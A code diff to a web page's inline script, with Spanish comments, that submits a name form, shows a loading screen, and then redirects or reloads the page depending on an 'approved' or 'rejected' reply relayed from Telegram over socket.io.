@@ -59,28 +59,31 @@
 
     <script>
         const socket = io();
-
+    
         document.getElementById('nameForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const formData = new FormData(e.target);
-
+    
             // Mostrar la pantalla de carga
             document.getElementById('loading').style.display = 'block';
             document.getElementById('formContainer').style.display = 'none';
-
+    
             await fetch('/submit_name', {
                 method: 'POST',
                 body: formData,
             });
-
+    
             // Esperar respuesta desde Telegram
             socket.on('telegram_response', (data) => {
-                if (data.response) {
+                if (data.response === 'approved') {
                     // Redirigir a la página intermedia
                     window.location.href = `/intermediate`;
+                } else if (data.response === 'rejected') {
+                    // Recargar la página principal
+                    window.location.reload();
                 }
             });
         });
-    </script>
+    </script>    
 </body>
 </html>
